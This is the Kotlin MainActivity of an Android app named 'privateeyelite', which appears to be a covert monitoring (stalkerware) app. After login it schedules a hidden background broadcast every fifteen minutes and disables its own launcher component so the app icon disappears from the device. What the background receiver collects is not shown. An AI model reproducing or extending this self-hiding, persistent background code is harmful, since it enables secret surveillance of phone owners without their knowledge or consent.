package com.rashediqbal.privateeyelite

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity


class MainActivity : AppCompatActivity() {


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val session = SessionManager(this)

        Log.d("MySession","${session.checkLogin()} ${session.getUser()}")

        when {
            session.checkLogin() -> {
                val i = Intent(this,BackgroundReceiver::class.java)
                i.action = "BACKGROUND_PROCESS"

                val pIntent = PendingIntent.getBroadcast(this,0,i, 0)
                val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
                alarmManager.setRepeating(AlarmManager.RTC_WAKEUP,5000,AlarmManager.INTERVAL_FIFTEEN_MINUTES,pIntent)

                val p = packageManager
                p.setComponentEnabledSetting(
                    componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
            }

            session.checkCredential() -> {

                startActivity(Intent(this,PermissionActivity::class.java))
                finish()

            }

            else -> {
                startActivity(Intent(this,WelcomeActivity::class.java))
                finish()

            }
        }



    }
}